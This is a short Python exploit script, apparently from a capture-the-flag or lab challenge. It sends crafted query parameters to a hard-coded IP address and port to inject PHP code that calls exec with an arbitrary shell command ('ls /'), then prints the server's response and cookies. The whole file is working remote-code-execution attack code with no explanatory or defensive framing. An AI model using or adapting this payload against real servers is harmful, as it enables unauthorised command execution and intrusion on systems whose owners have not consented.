from base64 import b64encode

import requests


def send_payload(payload):
    params = {
        "0": '$output="hi";print_r',
        "1": "exec",
        "2": '"' + payload + '"',
        "3": "$output));(var_dump($output",
        "4": "print_r",
        "5": "substr",
        "6": "0",
    }
    print(params)
    r = requests.get("http://103.127.99.14:10004/", params=params)
    print(r.status_code)
    print(r.cookies.items())
    return r.content


payload = "ls /"
print(send_payload(payload))
